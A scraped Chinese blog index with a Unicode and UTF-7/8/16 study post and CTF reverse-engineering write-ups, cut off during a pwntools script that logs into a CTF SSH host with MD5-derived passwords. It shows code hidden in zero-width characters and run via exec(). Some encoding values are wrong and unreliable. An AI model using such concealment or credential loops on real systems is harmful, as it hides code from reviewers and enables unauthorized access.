̡̢̛̜̝̞̟̠̣ ̧̨̤̥̦̩̪̫̬ ̴̵̭̮̯̰̱̲̳ ̶̷̸̹̺̻̼̽̾ ͇̿̀́͂̓̈́͆ͅ ͈͉͍͎͊͋͌͏͐ ͓͔͕͖͙͑͒͗͘ ͚͛͜͟͢͝͞͠͡ ͣͤͥͦͧͨͩͪͫ ͬͭͮͯ\n这一坨是 Unicode 中的一些附加字符堆在一块的样子。附加字符在很多情境下都会被使用，例如：拼音。下面两组字符虽然看上去一样，但是对应的编码不一样。前者使用附加字符实现，后者是微软输入法特殊字符表中的打印字符。\nö：\\u006F\\u0308\nö：\\u00F6\n用 Python 就可以打印出附加字符。\n1string = \u0026#39; \u0026#39; 2 3for char in range(0x300, 0x310): 4 string = string + chr(char) 5 6print(string) 7 8 9# output: ̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏ 于是我们得到了一张鬼画符（？）\nUnicode 附加字符的优点正如你所看到的一样：更加灵活。\n代码混淆 Python 似乎是支持中文变量名的：\n1import dis as 蒂斯 2 3def 我再也不学Python了(): 4 苹果 = 10 5 香蕉 = 20 6 print(苹果 + 香蕉) 7 print(type(我再也不学Python了)) 8 9我再也不学Python了() 10 11蒂斯.dis(我再也不学Python了) 12 13\u0026#39;\u0026#39;\u0026#39; 14output: 15 1630 17\u0026lt;class \u0026#39;function\u0026#39;\u0026gt; 18 38 0 RESUME 0 19 20 39 2 LOAD_CONST 1 (10) 21 4 STORE_FAST 0 (苹果) 22 23 40 6 LOAD_CONST 2 (20) 24 8 STORE_FAST 1 (香蕉) 25 26 41 10 LOAD_GLOBAL 1 (NULL + print) 27 20 LOAD_FAST 0 (苹果) 28 22 LOAD_FAST 1 (香蕉) 29 24 BINARY_OP 0 (+) 30 28 CALL 1 31 36 POP_TOP 32 33 42 38 LOAD_GLOBAL 1 (NULL + print) 34 48 LOAD_GLOBAL 3 (NULL + type) 35 58 LOAD_GLOBAL 4 (我再也不学Python了) 36 68 CALL 1 37 76 CALL 1 38 84 POP_TOP 39 86 RETURN_CONST 0 (None) 40 41\u0026#39;\u0026#39;\u0026#39; 这种混淆算是较为一般的混淆，单纯修改变量名而不对运行逻辑进行修改，有些类似于“0O”混淆。但是这不禁让我想到，既然中文能够作为变量名，那么是不是大部分 Unicode 字符都可以当作变量名，甚至包括上文提到的零宽字符！\n实际上是不能的。但是零宽字符确实可以用于另一种形式的代码混淆，例如下面这段代码：\n1encoded = \u0026#34;‍‍‍‌‌‌‌​‍‍‍‌‌‍‌​‍‍‌‍‌‌‍​‍‍‌‍‍‍‌​‍‍‍‌‍‌‌​‍‌‍‌‌‌​‍‌‌‍‍‍​‍‌‌‍‌‌‌​‍‍‌‌‍‌‍​‍‍‌‍‍‌‌​‍‍‌‍‍‌‌​‍‍‌‍‍‍‍​‍‌‍‍‌‌​‍‌‌‌‌‌​‍‌‍‌‍‍‍​‍‍‌‍‍‍‍​‍‍‍‌‌‍‌​‍‍‌‍‍‌‌​‍‍‌‌‍‌‌​‍‌‌‌‌‍​‍‌‌‍‍‍​‍‌‍‌‌‍\u0026#34; 2exec(\u0026#34;\u0026#34;.join([chr(int(i.replace(\u0026#39;\\u200C\u0026#39;, \u0026#39;0\u0026#39;).replace(\u0026#39;\\u200D\u0026#39;, \u0026#39;1\u0026#39;), 2)) for i in encoded.split(\u0026#39;\\u200B\u0026#39;)])) 3 4# output: Hello, World! 我去，很神奇是不是！其原理也简单，使用零宽度字符隐写的方式将实际要执行的代码（在本案例中是 print(\u0026quot;Hello, World!)）编码，在执行的过程中再解码，有 SMC 那味。此案例中 encoded 生成的方式如下：\n1code = \u0026#34;\u0026#34;\u0026#34;print(\u0026#39;Hello, World!\u0026#39;)\u0026#34;\u0026#34;\u0026#34; 2encoded = \u0026#39;_\u0026#39; + \u0026#39;\\u200B\u0026#39;.join([bin(ord(i))[2:].replace(\u0026#39;0\u0026#39;,\u0026#39;\\u200C\u0026#39;).replace(\u0026#39;1\u0026#39;,\u0026#39;\\u200D\u0026#39;) for i in code]) + \u0026#39;_\u0026#39; 3print(encoded) 4 5# output: _‍‍‍‌‌‌‌​‍‍‍‌‌‍‌​‍‍‌‍‌‌‍​‍‍‌‍‍‍‌​‍‍‍‌‍‌‌​‍‌‍‌‌‌​‍‌‌‍‍‍​‍‌‌‍‌‌‌​‍‍‌‌‍‌‍​‍‍‌‍‍‌‌​‍‍‌‍‍‌‌​‍‍‌‍‍‍‍​‍‌‍‍‌‌​‍‌‌‌‌‌​‍‌‍‌‍‍‍​‍‍‌‍‍‍‍​‍‍‍‌‌‍‌​‍‍‌‍‍‌‌​‍‍‌‌‍‌‌​‍‌‌‌‌‍​‍‌‌‍‍‍​‍‌‍‌‌‍_ 6# 为了便于复制，我在编码的前后各加了一个下划线 UTF-7 UTF-7 编码并不是一种严格的 Unicode 编码。个人认为，这种编码实际上更加类似于 Base64 编码。UTF-7 的出现，是为了满足早期只能传输 7-bit 字符的 SMTP 标准，故现在 UTF-7 编码也正在逐渐被弃用。UTF-7 原理较为简单，下面是一个简单的 UTF-7 与 UTF-8 转化的例子。首先我们拿出待转化的 UTF-8 字符：\n绷\n然后打印出它的编码的二进制：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;) 2\u0026#39;0111111011110111\u0026#39; 然后像 Base64 编码那样将其六位一组切开，不够的位置补零。\n1\u0026gt;\u0026gt;\u0026gt; [\u0026#39;0111111011110111\u0026#39;.ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)] 2[\u0026#39;011111\u0026#39;, \u0026#39;101111\u0026#39;, \u0026#39;011100\u0026#39;] 随后查表。UTF-7 中使用的 Base64 编码表和标准 Base64 编码表有一些区别。UTF-7 使用的编码表并不使用 = 补齐。由此我们可以写出编码转化的最后一步了：\n1\u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [\u0026#39;011111\u0026#39;, \u0026#39;101111\u0026#39;, \u0026#39;011100\u0026#39;]]) 2\u0026#39;fvc\u0026#39; 于是我们得到了 绷 这个汉字的 UTF-7 编码：fvc。\n把上面的代码碎片合计一下，我们就能得到获取单个 UTF-8 字符的 UTF-7 编码的代码：\n1print(\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]])) 2 3# output: fvc UTF-7 编码有许多例外的情况：\n62 个数字与英语字母不需要转化；' ( ) , - . / : ? 这九种字符也无需转化。 + 被编码做 +-。 每一个区块以 + 为开头，- 为结尾。 1print(\u0026#34;+\u0026#34; + \u0026#34;-+\u0026#34;.join([\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(k))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]]) for k in \u0026#34;绷不住了，笑えるwww\u0026#34;]) + \u0026#34;-\u0026#34;) 2 3# output: +fvc-+Tg0-+T08-+ToY-+/ww-+exE-+MEg-+MIs-+AHc-+AHc-+AHc- 上面这行代码能且只能标准地编码非 ASCII 编码字符的 UTF-8 编码字符，而不能对 ASCII 编码字符进行标准地编码，因为有近一半的 ASCII 字符的 UTF-7 编码与其 ASCII 编码一致——正如上文提到的那样。Cyberchef 里面带有 UTF-7 的编码和解码工具，并且那一解码工具能够对我这段非标准的编码进行解码。\n其实硬解也能解码，不是吗？\n既然编码代码都有了，那不妨把对应的解码代码造出来吧。还是要优雅地塞到一行里去：\n1print(\u0026#34;\u0026#34;.join([chr(int(int((bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[0]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[1]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[2]))[2:].rjust(6, \u0026#39;0\u0026#39;))[: -2], 2))) for i in \u0026#39;+fvc-+Tg0-+T08-+ToY-+/ww-+exE-+MEg-+MIs-+AHc-+AHc-+AHc-\u0026#39;[1:-1].split(\u0026#34;-+\u0026#34;)])) 2 3# output: 绷不住了，笑えるwww 实际上字符串位置是可以用 input() 的，我们不妨改成更易于在 Python Shell 里运行的代码：\n1\u0026gt;\u0026gt;\u0026gt; print(\u0026#34;+\u0026#34; + \u0026#34;-+\u0026#34;.join([\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(k))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]]) for k in input(\u0026#34;\u0026gt; \u0026#34;)]) + \u0026#34;-\u0026#34;) 2\u0026gt; 先帝创业未半而骈死于槽枥之间 3+UUg-+Xh0-+Uhs-+Tho-+Zyo-+U0o-+gAw-+mog-+a3s-+To4-+af0-+Z6U-+Tks-+lfQ- 4\u0026gt;\u0026gt;\u0026gt; print(\u0026#34;\u0026#34;.join([chr(int(int((bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[0]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[1]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[2]))[2:].rjust(6, \u0026#39;0\u0026#39;))[: -2], 2))) for i in input(\u0026#34;\u0026gt; \u0026#34;)[1:-1].split(\u0026#34;-+\u0026#34;)])) 5\u0026gt; +UUg-+Xh0-+Uhs-+Tho-+Zyo-+U0o-+gAw-+mog-+a3s-+To4-+af0-+Z6U-+Tks-+lfQ- 6先帝创业未半而骈死于槽枥之间 本段 UTF-7 相关代码纯手搓，Just for fun!\nUnicode 与 UTF-8、UTF-16、UTF-32 本来这一段应该是留给 UTF-16 的，但是学习了一些内容之后我感觉我对 UTF-8 也一点都不了解。遂把这些合并到一起去。\n这四者的关系，Unicode 是字符集，字符集中的每一个字符都有唯一的编号；后面四者为编码方式，用不同的方式表示出某一个字符。举一个例子：绷 这个字的 Unicode 编号是 U+7EF7，UTF-8 编码是 E7 BB B7，UTF-16LE 编码是 EB AF B7，UTF-32LE 编码是 F1 BB AF A7。\n下面这张表列出了你能见到 Unicode 编号以及编码的地方：\nUnicode 编号 UTF 编码 形如 U+XXXX 的 二进制文本查看器 各种编程语言中 \\uXXXX 或者 \\UXXXXXXXX 各种编程语言中打印 0xXXXX 对应的字符 Python 中使用 ord() 函数 所以说，本文前面的某些内容是不严谨的（我长期错把 Unicode 编号当作 UTF-8 编码） ㄟ( ▔, ▔ )ㄏ\nUnicode 与 UTF-8 Unicode 编号范围是 U+0000 到 U+10FFFF，占据字节大小为 1 到 3 个不等。下表展示了 Unicode 编号长度与 UTF-8 编码长度的关系：\nUnicode 编号范围 UTF-8 编码二进制格式 UTF-8 编码占据字节数 U+00 - U+7F 0XXXXXXX 1 U+80 - U+07FF 110XXXXX 10XXXXXX 2 U+0800 - U+FFFF 1110XXXX 10XXXXXX 10XXXXXX 3 U+010000 - U+10FFFF 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX 4 0 - 7F 的范围是 ASCII 编码的范围，这一部分 UTF-8 与 ASCII 编码是一致的。在后面的编码中，每个编码由多个字节组成，其中第一个字节前面由若干个连续的 1 和一个 0 开头，这用于告诉计算机，有多少个连续的 1，就说明字符从这一个字节开始，共占据了多少个字节。其后每一个字节都以 10 开头。中间的 X 则使用 Unicode 编号的二进制填充。\n例如 绷 这个字，其 Unicode 编号为 U+7EF7，在上表中显然位于第三行。我们先打印出其二进制：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;) 2‘0111111011110111’ 随后按照 4+6+6 的宽度将其切成三份：0111 111011 110111。\n然后手动填充格式，得到 UTF-8 编码的二进制：11100111 10111011 10110111\n1\u0026gt;\u0026gt;\u0026gt; hex(0b111001111011101110110111) 2\u0026#39;0xe7bbb7\u0026#39; 于是，我们得到了 绷 这个字的 UTF-8 编码：E7 BB B7\n需要注意的是，填充那一步需要从右向左填充，因而如果最高位是 0 就可以省略（不然你猜为什么 2 字节 UTF-8 编码中可填充的二进制位只有 11 个）。\nUnicode 与 UTF-16 与 UTF-8 一样，UTF-16 也是一种变长字节编码格式。不过 UTF-16 的编码方式更为简单粗暴:\n对于编号在 U+0000 到 U+FFFF 的字符，直接把编号当作编码，统一占两个字节 对于编号在 U+10000 到 U+10FFFF 的字符，先给它减去 0x10000，再填进 110110XX XXXXXXXX 110111XX XXXXXXXX 举个例子：兔\n如果你复制下来，你会发现它这个字占了四个字节，它的 Unicode 编号是 U+2F80E。我在“中日韩兼容表意文字区（CJK Compatibility Ideographs）”复制了这个字符，一些日语汉字会出现在这个区间。使用某些日语输入法打印出来的日语汉字的编码会与中文一样，这一区间用于存储日、韩、越语言中特有或者异形汉字。但是根据 NFKC 标准化，在网页上你是能够直接通过搜索“兔”找到这个字的。\n把它转换成 UTF-16，首先将其 Unicode 编号减去 0x10000：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;兔\u0026#39;) - 0x10000)[2:].rjust(20, \u0026#39;0\u0026#39;) 2\u0026#39;00011111100000001111\u0026#39; 随后按照 2+8+2+8 的宽度将其切成四份：00 01111110 00 00001111。\n然后手动填充格式，得到 UTF-16 编码的二进制：11011000 01111110 11011100 00001111\n1\u0026gt;\u0026gt;\u0026gt; hex(0b11011000011111101101110000001111) 2\u0026#39;0xd87edc0f\u0026#39; 于是，我们得到了 兔 这个字的 UTF-16 编码：D8 7E DC 0F\nUTTF-16 编码是两个字节为一组读取，因此就要考虑字节序的问题。上面这一种为大端序，也就是 UTF-16BE，其小端序存储形式 UTF-16LE 为 7E D8 0F DC。为了区分大小端序，文件开头部分会有 FE FF（大端序）或 FF FE（小端序）的标注。而 UTF-8 编码中，计算机按顺序每次读取一个字节，因此不存在大小端序的问题。\n这时聪明的小朋友就要问了，计算机怎么知道这一个字符占了两个字节还是四个字节呢？这就不得不说 Unicode 的巧妙之处了。如果你仔细观察 Unicode 字符集，你会发现 U+D800 到 U+DBFF 被描述为\u0026quot;High Surrogate\u0026quot;（高代理项），U+DC00 到 U+DFFF 被描述为\u0026quot;Low Surrogate\u0026quot;（低代理项）。这两个区间内（连起来就是一个区间）并不存储字符，而这两个区间又分别是 110110XX XXXXXXXX 与 110111XX XXXXXXXX 的范围。因此，当计算机两字节一组读取到 D8 到 DB 中的某个值，就知道这个字符占据四个字节；读取到 DC 到 DF 中某个字节，就知道这两个字节要跟着前面两个字节一块解码。\nUnicode 与 UTF-32 UTF-32 是固定宽度编码，每一个编码占据 4 个字节，因此也许是最好理解的一种编码，直接由 Unicode 编号作为编码，因此 UTF-32 也有浪费存储空间的特点。\n","link":"https://jackgdn.github.io/post/unicode-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"post","tags":["Python","Unicode","编码"],"title":"Unicode 学习记录"},{"body":"","link":"https://jackgdn.github.io/tags/%E7%BC%96%E7%A0%81/","section":"tags","tags":null,"title":"编码"},{"body":" CSGO 一个 Go 编写的程序，不过似乎没法调试（一调试就会卡住），尝试不使用调试器运行，然后 attach 到进程上去，这样才能动调。\n先静态分析。\n在 main_main() 函数 75 行处，fmt_Fscanf() 读取我们输入的内容；79-103 行对输入内容进行操作。104-125 行判断输入内容是否正确并给出答复。\n如上图，值得注意的是，在第 88 行处出现 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/，疑似是 Base64 编码。\n现在在进入判断前的语句处打断点调试，发现如下字符串：\nkx8skC4EXSgqkuQ5kQI4XAIEmCgqnuX/mR8EiB45mCoqjfU6oicqk/HsTi/=\n看来这里使用的是 Base64 无疑了。不过这一串怎么看怎么不像正常编码编码出来的 flag。\n尝试后也确实是这样。众所周知，正常 Base64 编码的 'fla' 三个字符是 'Zmxh'，这四个字符在编码表中的相对位置分别是 13、11、-16，而此编码前四个字符的相对位置也分别是 13、11、-16，因此我们大胆猜测换过的编码表只是将原先的编码表循环位移，根据偏移量知道换过的编码表为 'LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK='\nflag{y0u_f1nd_m3_you_r34lly_know_aBout_gO!!} ezvm 程序相当简洁。程序读取输入的 34 个字节并存储到 program 中。fetch() 函数读取 program 中的操作码，eval() 函数则会根据操作码执行程序。虚拟机的核心，也就是虚拟机执行部分的伪代码如下：\n1switch ( a1 ) 2{ 3 case 0: 4 ++dword_404024; 5 ++dword_408030; 6 result = dword_404024; 7 stack[dword_404024] = program[dword_408030]; 8 break; 9 case 1: 10 stack[++dword_404024] = program[++dword_408030]; 11 v3 = dword_404024--; 12 v12 = stack[v3]; 13 v4 = dword_404024--; 14 v11 = stack[v4]; 15 result = ++dword_404024; 16 stack[dword_404024] = v11 + v12; 17 break; 18 case 2: 19 v2 = dword_404024--; 20 result = stack[v2]; 21 break; 22 case 3: 23 running = 0; 24 result = puts(\u0026#34;done\u0026#34;); 25 break; 26 case 4: 27 stack[++dword_404024] = program[++dword_408030]; 28 v5 = dword_404024--; 29 v10 = stack[v5]; 30 v6 = dword_404024--; 31 v9 = stack[v6]; 32 result = ++dword_404024; 33 stack[dword_404024] = v10 ^ v9; 34 break; 35 case 5: 36 stack[++dword_404024] = program[++dword_408030]; 37 v7 = dword_404024--; 38 v8 = stack[v7]; 39 result = v8; 40 if ( v8 != stack[dword_404024] ) 41 exit(0); 42 return result; 43 default: 44 return result; 45} 这里又使用 stack 模拟栈操作。为了方便后面表述，我们称高地址为栈顶，低地址为栈底。\n虚拟机中一共定义六种操作码：\n操作码 描述 0x00 将 program 中该操作码后的一个值压入栈顶 0x01 将栈顶的两个值相加，存储到其中较低的地址 0x02 栈顶指针向低地址移动。虽然栈以外的值没有被丢弃，但是也不会再被使用了，因此该题中“栈顶”是以栈指针确定的 0x03 结束运行，并给出完成运行的提示，也就是我们想要的提示 0x04 对栈顶的两个值做异或操作，存储到其中较低的地址 0x05 比较栈顶两个值是否相等，如果相等则继续运行，如果不相等则退出 下面开始分析操作码，即 program 中的数据。\n导出 program 中的操作码并且略加整理（例如经过调试后知道栈中只保留一个字节，故 07E8h 只保留 0xE8；）后，操作码如下所示：\n100 66 00 6C 00 61 00 67 200 66 00 6C 00 61 00 67 300 66 00 6C 00 61 00 67 400 66 00 6C 00 61 00 67 500 66 00 6C 00 61 00 67 600 66 00 6C 00 61 00 67 700 66 00 6C 00 61 00 67 800 66 00 6C 00 61 00 67 900 66 00 6C 10 1101 E8 04 03 05 66 1202 01 E8 04 03 05 56 1302 01 E8 04 03 05 5D 1402 01 E8 04 03 05 44 1502 01 E8 04 03 05 4F 1602 01 E8 04 03 05 55 1702 01 E8 04 03 05 1F 1802 01 E8 04 03 05 5F 1902 01 E8 04 03 05 58 2002 01 E8 04 03 05 39 2102 01 E8 04 03 05 4E 2202 01 E8 04 03 05 4F 2302 01 E8 04 03 05 55 2402 01 E8 04 03 05 3E 2502 01 E8 04 03 05 44 2602 01 E8 04 03 05 5E 2702 01 E8 04 03 05 54 2802 01 E8 04 03 05 62 2902 01 E8 04 03 05 44 3002 01 E8 04 03 05 18 3102 01 E8 04 03 05 50 3202 01 E8 04 03 05 1A 3302 01 E8 04 03 05 57 3402 01 E8 04 03 05 44 3502 01 E8 04 03 05 58 3602 01 E8 04 03 05 50 3702 01 E8 04 03 05 1B 3802 01 E8 04 03 05 54 3902 01 E8 04 03 05 57 4002 01 E8 04 03 05 60 4102 01 E8 04 03 05 4C 4202 01 E8 04 03 05 4A 4302 01 E8 04 03 05 57 4402 01 E8 04 03 05 4D 4502 01 02 03 经过格式化的处理，可以大体看出程序分为两部分：\n第一部分存储入栈指令以及我们输入的数据（在此次调试中。我输入的是 'flagflagflagflagflagflagflagflagfl'），程序依次将我们输入的字符压入栈。在静态分析中，这一部分在未经初始化时全部由 0 填充。\n程序的第二部分对全部 34 个字符做了相同的操作并进行判定，使用代码表示就是 ((input + 0xE8) % 0x100) ^ 3 == dest。其中，input 是我们输入的字符，dest 是上面每一行的最后一个操作码，对 0x100 取模的原因依然是 stack 中仅能保留一个字节。上述过程在动态调试中可以非常清晰地展现出来。此外，除了第一个字符，程序在对后续每一个字符进行操作的时候都有一个栈顶指针向低地址移动的过程，即字符串是从后向前处理的，因此我们在恢复字符串的过程中也要倒序处理：\n1c = [0x66, 0x56, 0x5D, 0x44, 0x4F, 0x55, 0x1F, 0x5F, 0x58, 0x39, 0x4E, 0x4F, 0x55, 0x3E, 0x44, 0x5E, 0x54, 0x62, 0x44, 0x18, 0x50, 0x1A, 0x57, 0x44, 0x58, 0x50, 0x1B, 0x54, 0x57, 0x60, 0x4C, 0x4A, 0x57, 0x4D] 2for i in c[::-1]: 3 print(chr((i ^ 3) + 0x100 - 0xE8), end = \u0026#39;\u0026#39;) flag{lo0ks_l1k3_you_UndeRst4nd_vm} maze 程序是用 Python 编写的，先拆包。反编译得到的 .pyc 文件：\n1from maze import run 2run() 程序的主要逻辑不在这一段 Python 代码里，而是在 maze.run() 方法中。而先前在 ELF 文件中拆出来的恰好有一个 maze.so，因此对这个动态链接库展开分析。\n先将它作为模块导入 Python 看一看里面有什么东西：\n1import sys 2sys.path.append(\u0026#39;./maze.so\u0026#39;) 3import maze 4help(maze) 根据这些可以得到\n1DATA 2 EqdU3uQNCi= [18, 17, 15, 0, 27, 31, 10, 19, 14, 21, 25, 22, 6, 3, 30, 8, 24, 5, 7, 4, 13, 29, 9, 26, 1, 2, 28, 16, 20, 32, 12, 23, 11] 3 UJ9mxXxeoS= \u0026#39;IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgXl4gIyMgXl4gIyMKIyMgIyMgIyMgLi4gIyMgSVogIyMgIyMgIyMgIyMKIyMgJVIgLi4gJUQgIyMgJUQgLi4gLi4gJUwgIyMKIyMgPj4gIyMgLi4gIyMgRUEgKiogUFAgJVUgIyMKIyMgJVUgSUEgVEEgIyMgRUIgKiogUFAgJVUgIyMKIyMgJVUgSUIgVEIgIyMgRUMgKiogUFAgJVUgIyMKIyMgJVUgSUMgVEMgIyMgRUQgKiogUFAgJVUgIyMKIyMgJVUgSUQgVEQgIyMgRUUgKiogUFAgJVUgIyMKIyMgJVUgSUUgVEUgIyMgRUYgKiogUFAgJVUgIyMKIyMgJVUgSUYgVEYgIyMgJVIgKiogSVogJVUgIyMKIyMgJVUgSUcgJUwgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgIyMgIyMgIyMKClBQIC0+ICs9MQpNTSAtPiAtPTEKSVogLT4gPTAKRUEgLT4gSUYgPT0wIFRIRU4gJVIgRUxTRSAlRApFQiAtPiBJRiA9PTEgVEhFTiAlUiBFTFNFICVECkVDIC0+IElGID09MiBUSEVOICVSIEVMU0UgJUQKRUQgLT4gSUYgPT0zIFRIRU4gJVIgRUxTRSAlRApFRSAtPiBJRiA9PTQgVEhFTiAlUiBFTFNFICVECkVGIC0+IElGID09NSBUSEVOICVSIEVMU0UgJUQKVEEgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklBIC0+ID03MgpUQiAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUIgLT4gPTczClRDIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJQyAtPiA9ODQKVEQgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklEIC0+ID04MApURSAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUUgLT4gPTY3ClRGIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJRiAtPiA9ODQKSUcgLT4gPTcwCkxUIC0+IElGID09NiBUSEVOICVEIEVMU0UgJUwK\u0026#39; 4 c2VjcmV0= [7, 47, 60, 28, 39, 11, 23, 5, 49, 49, 26, 11, 63, 4, 9, 2, 25, 61, 36, 112, 25, 15, 62, 25, 3, 16, 102, 38, 14, 7, 37, 4, 40] 5 regexes= {\u0026#39;wall\u0026#39;: \u0026#39;##|``\u0026#39;, \u0026#39;path\u0026#39;: \u0026#39;\\\\.\\\\.\u0026#39;, \u0026#39;splitter\u0026#39;: \u0026#39;\u0026lt;\u0026gt;\u0026#39;, \u0026#39;pause\u0026#39;: \u0026#39;[0-9]{2}\u0026#39;, \u0026#39;start\u0026#39;: \u0026#39;\\\\^\\\\^\u0026#39;, \u0026#39;hole\u0026#39;: \u0026#39;\\\\(\\\\)\u0026#39;, \u0026#39;out\u0026#39;: \u0026#39;\u0026gt;\u0026gt;\u0026#39;, \u0026#39;in\u0026#39;: \u0026#39;\u0026lt;\u0026lt;\u0026#39;, \u0026#39;one-use\u0026#39;: \u0026#39;--\u0026#39;, \u0026#39;direction\u0026#39;: \u0026#39;%[LRUDNlrudn]\u0026#39;, \u0026#39;signal\u0026#39;: \u0026#39;(?\u0026lt;=\\\\*)[\\\\*A-Za-z0-9]\u0026#39;, \u0026#39;function\u0026#39;: \u0026#39;[A-Za-z][A-Za-z0-9]\u0026#39;} 在 IDA 中直接搜索 'run'，可以得到 maze.run() 方法的伪代码。\n在这个函数里，发现调用了 _pyx_mstate_global_static.__pyx_n_s_c29sdmU 进行加密。'c29sdmU' 使用 Base64 解码是 solve。\n随后查找 c29sdmU。在 _pyx_pw_4maze_3c29sdmU() 函数中进行了加密操作。同时找到 maze.mazeLang 作为 maze 语言的解释器：\n在这道题中的 Maze，是一种编程语言：\n1##,##,## 2##,^^,## //Car Starts 3##,AA,## //Do AA to Car 4##,\u0026gt;\u0026gt;,## //Print Car 5##,(),## //Destroy Car 6##,##,## 7 8AA-\u0026gt; =\u0026#34;Hello World!\u0026#34; 而我们最开始 help() 中得到的 UJ9mxXxeoS，就是 Base64 编码后的 mazeLang。现在根据已知的信息写出一下脚本：\n1import sys 2sys.path.append(\u0026#39;./maze.so\u0026#39;) 3import maze 4import base64 5maze.aW5pdF9zZWNyZXQ() # 初始化 6flag = \u0026#39;\u0026#39; 7c = maze.TWF6ZUxhbmc(base64.b64decode(maze.UJ9mxXxeoS).decode()) # 解码 maze 代码 8for i in range(33): 9 flag += c.cnVuX3RpbGxfb3V0cHV0() ^ maze.c2VjcmV0[i] # 执行 maze 代码并且还原明文 10print(flag) flag{yOu_@re_m@sT3r_OF_mAZElaN6} 孩子们，我回来了 程序使用了 Base64 编码，不过显然是换过表的。动调程序的时候程序会抛出异常，根本看不到换表的过程\n不过程序还是给我们留下了破绽。不管我们输入什么内容，程序都会输出我们输入内容的编码和正确的编码。\n既然只要编码相同原字符串就相同，那我们可以尝试单字节爆破。仅展示爆破最后一个字符的脚本（当然我们都知道最后一个字符是啥）：\n1import subprocess 2 3known = \u0026#34;flag{s3e_y0u_4ga1in?you_did_1t!!\u0026#34; 4 5for i in range(32, 128): 6 flag = known + chr(i) 7 p = subprocess.Popen([\u0026#34;孩子们，我回来了.exe\u0026#34;], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE) 8 p.stdin.write(flag.encode()) 9 p.stdin.close() 10 out = p.stdout.read() 11 if out[0:44] == out[-67:-23]: 12 print(flag) 前面字符爆破的方式差不多，只是由于经过 Base64 编码的文本原文和编码是不等长的，所以有时会出现多个字符都满足条件的情况，这时需要调整匹配字符串长度以及根据语义分析来缩小范围。\nflag{s3e_y0u_4ga1in?you_did_1t!!} ","link":"https://jackgdn.github.io/post/2.19/","section":"post","tags":["WP","Reverse"],"title":"2.19 解题记录"},{"body":"users \u0026amp; users_revenge 两道题可以用同一个脚本解。两道题区别就是题目 1 给出 200 个用户名，题目 2 给出 500 个用户名，密码为用户名的 MD5，其中有一个用户里有 flag，考虑使用 pwntools 连接。\n1from pwn import * 2import hashlib 3 4usrlst = [] 5pwdlst = [] 6flaglst = [] 7sususrlst = [] 8suspwdlst = [] 9excptlst = [] 10\u0026#39;\u0026#39;\u0026#39; 11file_name = 12given_host = 13given_port = 14\u0026#39;\u0026#39;\u0026#39; 15with open(file_name, \u0026#39;r\u0026#39;) as wordlist: 16 for line in wordlist: 17 username = line.rstrip() # 去除换行符 18 usrlst.append(username) 19 pwdlst.append(hashlib.md5(username.encode()).hexdigest()) 20 21for i in range(len(usrlst)): 22 try: 23 print(i) 24 shell = ssh(host = given_host, port = given_port, user = usrlst[i], password = pwdlst[i]) # 题目使用 SSH 连接 25 sh = shell.run(\u0026#39;ls -a\u0026#39;) # 不知道文件名与路径，先使用 ls -a 探探虚实。最后知道 